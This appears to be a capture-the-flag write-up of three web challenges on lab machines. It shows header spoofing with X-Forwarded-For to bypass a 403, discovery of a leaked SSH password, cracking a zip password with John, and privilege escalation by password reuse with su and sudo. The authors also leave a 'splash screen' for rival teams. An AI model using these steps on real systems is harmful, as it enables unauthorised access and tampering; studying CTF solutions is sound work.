# Forbidden Folly 1, 2 and 3

Category: Web  
Creator : Rem1nd

## Forbidden Folly 1, 50 points
"Welcome to Hacker2, where uptime is a main prority: http://172.31.2.90"

Alright. So we open it. Gives 403 Forbidden in the browser. Same when using curl.
The uptime hint in the challenge text strongly implies the site is accessible somehow, however. We look around, try requesting various common pages, but everything is met with 403 Forbidden. Time to try looking at request headers.

Nothing appears weird when inspecting browser traffic. `curl -v http://172.31.2.90` shows nothing interesting either. Let's throw all the shady HTTP headers on curl that we can find, and see if one of the payloads yield something interesting:

```
$ curl -s 'http://172.31.2.90/' \
-H 'Connection: keep-alive' \
-H 'Cache-Control: max-age=0' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.9,da;q=0.8' \
-H 'X-Originating-IP: 127.0.0.1' \
-H 'X-Forwarded-For: 127.0.0.1' \
-H 'X-Remote-IP: 127.0.0.1' \
-H 'X-Remote-Addr: 127.0.0.1' | tee index.html | file -
/dev/stdin: HTML document, ASCII text, with very long lines
$ see index.html
```

Aha! We got a "HackerTwo System Status" page!  
It has nothing we can interact with. But maybe we won't need to...

```
$ grep -i flag index.html 
    <!-- flag(Th4t_WAS_To0_EASY} -->
```

## Forbidden Folly 2, 50 points
"It seems like out of towners are terrible at scavenger hunts: http://172.31.2.91"

It turns out the only header we needed was this:

```
$ curl -s 'http://172.31.2.91' -H 'X-Forwarded-For: 127.0.0.1'
```

But the page we reach is exactly the same as before (md5sum checks out). So we back-track a few steps and try out various common file and folder names again.
'/debug' yields a file listing with a 'secret.txt' file. Bingo.

```
$ curl -s 'http://172.31.2.91/debug/secret.txt' -H 'X-Forwarded-For: 127.0.0.1'
Chad,

I've created an account for you here on the system. You can log into ssh with the user chad and the password FriendOfFolly^.
Please delete this message after you've read it.

PS: flag{Th3_nexT_0ne_iS_D1ff1cul7}

Thanks,
Grace
```

Thanks Grace!

Challenge completed. At this time Forbidden Folly 3 was not yet released. Let's go solve it!

```
$ sshpass -p 'FriendOfFolly^' ssh chad@172.31.2.91
chad$ find
[...]
./secretpassword.zip
chad$ find /var/www/
[...]
^D
$ sshpass -p 'FriendOfFolly^' scp chad@172.31.2.91:~/secretpassword.zip .
$ unzip -l secretpassword.zip 
Archive:  secretpassword.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       11  2018-07-05 00:14   secretpassword
---------                     -------
       11                     1 file
$ unzip secretpassword.zip 
Archive:  secretpassword.zip
[secretpassword.zip] secretpassword password: 
```

Damn.

The machine didn't have any other interesting accessible files, nor obvious escalation opportunities. But then again, it's a web challenge. We move on, but not before leaving a charming splash screen for our opponents to find... And the same on chad@172.31.2.92.

Eventually John succeeds cracking the password. 'poopstinks'. secretpassword contains 'FL0WMATIC^'.

Perhaps we solved Forbidden Folly 3? We won't know for a while...

## Forbidden Folly 3, 100 points
"Priv esc is the name of the game: http://172.31.2.92"

It's up! Submit flag 'FL0WMATIC^'! 'poopstinks'? 'FriendOfFolly^'...?

Alas. It wasn't to be. But look at that, the message says to escalate. We already checked many escalation opportunities but didn't find much of interest. However, there were a few user accounts, including root, chad, firstsetup and hopper. And we just got some possible passwords, leaving us with the following candidates: 'FriendOfFolly^', 'poopstinks' and 'FL0WMATIC^'.

chad isn't allowed to sudo. `sudo` needs a password. `su` shows root doesn't have one of the above passwords. firstsetup is probably an account used for setup. hopper sounds interesting...

```
$ sshpass -p 'FriendOfFolly^' ssh chad@172.31.2.91
chad$ su hopper
Password:
su: Authentication failure
chad$ su hopper
Password:
hopper$ # yay!
```

Now, hopper on his own turned out to not be interesting. But I wonder...

```
hopper$ sudo id
[sudo] password for hopper:
uid=0(root) gid=0(root) groups=0(root)
hopper$ sudo find /root
[...]
/root/flag.txt
hopper$ sudo cat /root/flag.txt
flag{D3STroyeR_0f_FollY}
```

Foiled!
